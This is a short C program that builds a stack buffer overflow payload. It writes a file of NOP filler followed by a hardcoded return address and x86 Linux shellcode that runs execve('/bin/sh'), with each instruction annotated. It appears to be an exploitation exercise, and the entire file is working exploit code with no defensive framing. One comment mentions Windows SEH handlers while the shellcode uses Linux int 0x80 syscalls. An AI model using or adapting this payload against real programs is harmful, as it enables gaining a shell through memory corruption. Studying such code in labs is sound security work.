#include <stdio.h>
#include <string.h>

#define FILENAME "shellcode"
#define BUF_SIZE 64 + 16 // 16 bytes to skip other locals and SEH handlers

char shellcode[] =
{
    // http://sparksandflames.com/files/x86InstructionChart.html enjoy
    "\x80\xf6\xff\xbf" // return address
    "\xeb\x1f"             // jmp 0x1f
    "\x5e"                 // pop esi
    "\x89\x76\x08"         // mov [esi + 0x8], esi
    "\x31\xc0"             // xor eax, eax
    "\x88\x46\x07"         // mov byte ptr [esi+0x7], eax
    "\x89\x46\x0c"         // mov [esi + 0xc], eax
    "\xb0\x0b"             // mov al, 0xb
    "\x89\xf3"             // mov ebx, esi
    "\x8d\x4e\x08"         // lea ecx, dword ptr [esi + 0x8]
    "\x8d\x56\x0c"         // lea edx, dword ptr [esi + 0xc]
    "\xcd\x80"             // int 80
    "\x31\xdb"             // xor ebx, ebx
    "\x89\xd8"             // mov eax, ebx
    "\x40"                 // inc eax
    "\xcd\x80"             // int 80
    "\xe8\xdc\xff\xff\xff" // call -0x24
    "/bin/sh"
};
char filler = '\x90';

int main()
{
    FILE *fp = fopen(FILENAME, "w");
    char buf[BUF_SIZE];

    printf("sh-sz=%d fill-sz=%d\n", sizeof(shellcode), BUF_SIZE - sizeof(shellcode));
    if(fp)
    {
        memset(buf, filler, BUF_SIZE);
        fwrite(buf, BUF_SIZE, 1, fp);
        fwrite(shellcode, sizeof(shellcode) - 1, 1, fp);
        fclose(fp);
    }
    else
    {
        printf("could not open file\n");
    }

    return 0;
}
